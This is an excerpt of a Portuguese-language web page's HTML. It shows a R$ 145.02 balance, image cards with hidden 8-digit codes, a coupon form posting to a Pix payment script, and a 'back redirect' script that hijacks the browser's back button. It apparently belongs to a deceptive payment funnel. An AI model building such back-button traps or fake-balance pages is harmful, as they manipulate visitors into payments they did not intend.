    ...
    <body class="fundoWhite">
        ...
        <div id="p1" style="background-color: #FFFFFF; padding: 15px 0 18px 0;">
            ...
            <div class="boxSaldo">
                ...
                <p class="valorSaldo">R$ <span class="saldoAtualizado">145.02</span></p>
            </div>
        ...
        <div id="produto1" style="width: 100%;">
            <div style="text-align: center; display: flex; justify-content: center; flex-direction: column; align-content: center; flex-wrap: wrap; position: relative;">
                ...
                <div class="container" id="container">
                    ...
                    <div class="cards">
                            ...
                            <img style="width: 80%;" src="images/90.jpg">
                            <input type="hidden" name="codigoEscolhido" id="codigoEscolhido-1" value="85829658">
                        </label>
                                                <label class="card" for="item-2" id="song-2">
                            <img style="width: 80%;" src="images/49.jpg">
                            <input type="hidden" name="codigoEscolhido" id="codigoEscolhido-2" value="32459664">
                        </label>
                                                <label class="card" for="item-3" id="song-3">
                            <img style="width: 80%;" src="images/41.jpg">
                            <input type="hidden" name="codigoEscolhido" id="codigoEscolhido-3" value="65763676">
                        </label>
                                                <label class="card" for="item-4" id="song-4">
                            <img style="width: 80%;" src="images/28.jpg">
                            <input type="hidden" name="codigoEscolhido" id="codigoEscolhido-4" value="86984235">
                        </label>
                                                <label class="card" for="item-5" id="song-5">
                            <img style="width: 80%;" src="images/1.jpg">
                            <input type="hidden" name="codigoEscolhido" id="codigoEscolhido-5" value="45464471">
                        </label>
                                                <label class="card" for="item-6" id="song-6">
                            <img style="width: 80%;" src="images/89.jpg">
                            <input type="hidden" name="codigoEscolhido" id="codigoEscolhido-6" value="27536355">
                        </label>
                                                <label class="card" for="item-7" id="song-7">
                            <img style="width: 80%;" src="images/36.jpg">
                            <input type="hidden" name="codigoEscolhido" id="codigoEscolhido-7" value="52417247">
                        </label>
                                                <label class="card" for="item-8" id="song-8">
                            <img style="width: 80%;" src="images/46.jpg">
                            <input type="hidden" name="codigoEscolhido" id="codigoEscolhido-8" value="66686958">
                        </label>
                                                <label class="card" for="item-9" id="song-9">
                            <img style="width: 80%;" src="images/79.jpg">
                            <input type="hidden" name="codigoEscolhido" id="codigoEscolhido-9" value="18986233">
                        </label>
                                                <label class="card" for="item-10" id="song-10">
                            <img style="width: 80%;" src="images/100.jpg">
                            <input type="hidden" name="codigoEscolhido" id="codigoEscolhido-10" value="19953159">
                        </label>
                                                <label class="card" for="item-11" id="song-11">
                            <img style="width: 80%;" src="images/12.jpg">
                            <input type="hidden" name="codigoEscolhido" id="codigoEscolhido-11" value="95452163">
                        </label>
                                            </div>
            ...
            <div id="codigoBarras" class="coolinput" style="margin-top: 275px; display: none;">
                ...
                <form action="https://reidocha.com/cupom/pix/pix.php" method="POST" id="formCupom">     
                    <label for="input" id="textoCodigoBarras" class="text">CUPOM</label>
                    <input style="font-size: 16px;" type="text" placeholder="Digite os 8 digitos do CUPOM" name="codigoBarrasDigitado" id="codigoBarrasDigitado" class="input" inputmode="numeric" autocomplete="off" required="" onkeyup="validacaoCodigoBarras3()">
        ...
        <script>
            // BACK REDIRECT
            var urlBackRedirect = '../prevsl/prevsl.php'; // lembre-se de usar a url sem espaços
